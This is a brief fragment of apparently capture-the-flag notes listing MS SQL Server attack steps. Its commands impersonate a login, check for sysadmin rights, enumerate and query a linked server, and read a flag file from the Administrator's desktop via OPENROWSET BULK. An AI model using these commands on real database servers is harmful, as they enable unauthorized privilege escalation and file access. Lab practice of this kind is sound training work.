16) EXECUTE AS LOGIN = 'john';  
SELECT SYSTEM_USER;  
SELECT IS_SRVROLEMEMBER('sysadmin');  
go  
17) to read the file -
SELECT srvname, isremote FROM sysservers;  
go  
EXECUTE('SELECT @@servername, @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [local.test.linked.srv];  
go  
execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];  
go
